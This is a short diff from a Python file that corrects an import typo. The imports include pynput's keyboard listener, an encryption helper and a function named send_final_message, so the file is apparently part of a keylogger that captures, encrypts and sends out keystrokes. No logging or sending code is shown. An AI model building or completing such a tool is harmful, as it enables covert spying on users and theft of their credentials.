@@ -1,5 +1,5 @@
 from pynput.keyboard import Listener, Key
-from encrypte import encrypt
+from encrypt import encrypt
 from quickstart import send_final_message
 
 
